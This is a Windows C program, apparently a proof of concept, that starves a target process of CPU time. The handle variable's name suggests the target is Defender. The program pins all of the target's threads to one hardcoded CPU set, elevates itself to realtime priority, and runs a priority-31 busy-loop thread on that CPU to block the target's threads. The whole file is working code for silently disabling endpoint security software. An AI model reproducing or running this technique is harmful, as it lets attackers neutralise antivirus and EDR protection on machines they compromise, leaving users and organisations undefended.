#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <TlHelp32.h>

typedef NTSTATUS(NTAPI* pfnNtSetInformationProcess)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength
	);

typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);

DWORD* EnumerateThreads(HANDLE hProcess, size_t* outCount) {
	*outCount = 0;
	DWORD processId = GetProcessId(hProcess);
	if (processId == 0) {
		return NULL;
	}

	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);

	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE) {
		return NULL;
	}

	// First pass: count matching threads
	size_t count = 0;
	if (Thread32First(hThreadSnap, &te32)) {
		do {
			if (te32.th32OwnerProcessID == processId) {
				count++;
			}
		} while (Thread32Next(hThreadSnap, &te32));
	}
	else {
		CloseHandle(hThreadSnap);
		return NULL;
	}

	if (count == 0) {
		CloseHandle(hThreadSnap);
		return NULL;
	}

	// Allocate array
	DWORD* threadIds = (DWORD*)malloc(sizeof(DWORD) * count);
	if (!threadIds) {
		CloseHandle(hThreadSnap);
		return NULL;
	}

	// Second pass: store thread IDs
	size_t idx = 0;
	Thread32First(hThreadSnap, &te32);
	do {
		if (te32.th32OwnerProcessID == processId) {
			threadIds[idx++] = te32.th32ThreadID;
		}
	} while (Thread32Next(hThreadSnap, &te32));

	CloseHandle(hThreadSnap);
	*outCount = count;
	return threadIds;
}

void DummyFunc()
{
	printf("In dummy func\n");
	// Just some busy work to keep the thread running
	DWORD a, b, c = 0;
	while (TRUE)
	{
		a = 4;
		b = a * 6;
		c = b / a;
		a, b, c = 0;
	}
}

int main(int argc, char* argv[])
{
	// Hardcoding CPU id here, this value retrieved from running tool and looking at the ID field
	// We just pick one of them
	ULONG id = 0x103;

	// Check current process priority and elevate to REALTIME_PRIORITY_CLASS
	DWORD prio = GetPriorityClass(-1);
	printf("Priority class: %x\n", prio);
	if (SetPriorityClass(-1, REALTIME_PRIORITY_CLASS))
		printf("SetPriorityClass success\n");
	else
		printf("SetPriorityClass failure: %d", GetLastError());
	prio = GetPriorityClass(-1);
	printf("New Priority class: %x\n", prio);

	// Grab PID from arg
	INT pid = atoi(argv[1]);
	printf("Attempting to open: %d\n", pid);
	HANDLE hDefender = OpenProcess(PROCESS_SET_LIMITED_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (!hDefender)
	{
		printf("Failed to open handle!\n");
		return;
	}

	// Enumerate system CPU info
	ULONG uBytesRequired = 0;
	GetSystemCpuSetInformation(NULL, 0, &uBytesRequired, hDefender, 0);
	printf("Required buffer size for GetSystemCpuSetInformation: %lu\n", uBytesRequired);

	PSYSTEM_CPU_SET_INFORMATION CpuInfo = (PSYSTEM_CPU_SET_INFORMATION)calloc(uBytesRequired, sizeof(char));
	if (!GetSystemCpuSetInformation(CpuInfo, uBytesRequired, &uBytesRequired, hDefender, 0))
	{
		printf("GetSystemCpuSetInformation failed: %u\n", GetLastError());
	}

	// Walk retrieved info
	PSYSTEM_CPU_SET_INFORMATION pIndex = CpuInfo;
	INT count = uBytesRequired / sizeof(SYSTEM_CPU_SET_INFORMATION);
	INT index = 1;
	printf("======================== GetSystemCpuSetInformation count: %d =========================\n", count);
	while (index < count)
	{
		printf("========= %d =========\n", index);
		printf("Size: 0x%x\n", pIndex->Size);
		printf("Type: 0x%x\n", pIndex->Type);
		printf("Id: 0x%x\n", pIndex->CpuSet.Id);
		printf("Group: 0x%x\n", pIndex->CpuSet.Group);
		printf("LogicalProcessIndex: 0x%02x\n", pIndex->CpuSet.LogicalProcessorIndex);
		printf("CoreIndex: 0x%02x\n", pIndex->CpuSet.CoreIndex);
		printf("LastLevelCacheIndex: 0x%02x\n", pIndex->CpuSet.LastLevelCacheIndex);
		printf("NumaNodeIndex: 0x%02x\n", pIndex->CpuSet.NumaNodeIndex);
		printf("EfficiencyClass: 0x%02x\n", pIndex->CpuSet.EfficiencyClass);
		printf("AllFlags: 0x%02x\n", pIndex->CpuSet.AllFlags);
		printf("-Parked: %d\n", pIndex->CpuSet.Parked);
		printf("-Allocated : %d\n", pIndex->CpuSet.Allocated);
		printf("-AllocatedToTargetProcess: %d\n", pIndex->CpuSet.AllocatedToTargetProcess);
		printf("-RealTime : %d\n", pIndex->CpuSet.RealTime);
		printf("-ReservedFlags : %d\n", pIndex->CpuSet.ReservedFlags);
		printf("\n");


		//pIndex->CpuSet.LogicalProcessorIndex = 0;
		index++;
		pIndex = (PVOID)((UINT_PTR)pIndex + (UINT_PTR)pIndex->Size);
	}

	// Free buffer
	free((PVOID)CpuInfo);

	// Set target process Default CPU so new threads use it
	if (SetProcessDefaultCpuSets(hDefender, &id, 1))
		printf("SetProcessDefaultCpuSets success\n");
	else
		printf("SetProcessDefaultCpuSets\n");

	// Enumerate threads then for each one set its CPU to the selected one.
	SIZE_T threadCount = 0;
	PDWORD threadIds = EnumerateThreads(hDefender, &threadCount);
	PVOID cpuIds = NULL;
	for (SIZE_T i = 0; i < threadCount; i++)
	{
		printf("ThreadId: %d\n", threadIds[i]);

		HANDLE hDefThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION | THREAD_SET_LIMITED_INFORMATION, FALSE, threadIds[i]);
		if (!hDefThread)
		{
			printf("OpenThread failed! GetLastError: %d", GetLastError());
			return;
		}

		ULONG uBytesRequired = 0;
		GetThreadSelectedCpuSets(hDefThread, NULL, 0, &uBytesRequired);
		printf("GetThreadSelectedCpuSets bytes required: %d GLE: %d\n", uBytesRequired, GetLastError());
		if (uBytesRequired > 0)
		{
			cpuIds = calloc(uBytesRequired, sizeof(ULONG));
			GetThreadSelectedCpuSets(hDefThread, cpuIds, 1, &uBytesRequired);
			printf("GetThreadSelectedCpuSets GLE: %d cpuIds: 0x%x\n", GetLastError(), *(ULONG*)cpuIds);
		}

		if (!SetThreadSelectedCpuSets(hDefThread, &id, 1))
		{
			printf("SetThreadSelectedCpuSets failed! GetLastError: %d\n", GetLastError());
			return;
		}
		else
			printf("SetThreadSelectedCpuSets success\n");

		if (uBytesRequired == 0)
			cpuIds = calloc(1, sizeof(ULONG));

		GetThreadSelectedCpuSets(hDefThread, cpuIds, 1, &uBytesRequired);
		printf("GetThreadSelectedCpuSets GLE: %d cpuIds: 0x%x\n", GetLastError(), *(ULONG*)cpuIds);
		free(cpuIds);
		CloseHandle(hDefThread);

		printf("\n\n");
	}

	// Create suspended thread targeting our dummy function
	HANDLE hThread = CreateThread(NULL, 0, DummyFunc, NULL, CREATE_SUSPENDED, NULL);

	// Set new thread to use the same CPU as target proc threads
	if (!SetThreadSelectedCpuSets(hThread, &id, 1))
	{
		printf("SetThreadSelectedCpuSets failed! GetLastError: %d\n", GetLastError());
		return;
	}
	else
		printf("SetThreadSelectedCpuSets success\n");

	// Set new thread to highest priority (31 only available due to thread having been converted to REALTIME_PRIORITY_CLASS
	if (!SetThreadPriority(hThread, 31))
		printf("SetThreadPriority Failed! GLE: %d\n", GetLastError());
	else
		printf("SetThreadPriority success\n");

	// Resume dummy thread to block target threads
	ResumeThread(hThread);

	// Wait so we don't exit
	WaitForSingleObject(hThread, INFINITE);
}